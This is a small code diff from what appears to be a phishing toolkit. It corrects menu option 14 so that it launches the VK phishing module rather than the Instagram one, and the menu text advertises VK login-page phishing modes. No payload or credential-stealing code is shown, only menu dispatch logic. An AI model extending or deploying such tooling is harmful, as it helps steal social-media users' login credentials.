@@ -265,7 +265,7 @@ def runPEnv():
     elif option == '14':
         loadModule('VK')
         option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
-        runPhishing('Instagram', option2)
+        runPhishing('VK', option2)
     else:
         exit(0)
 
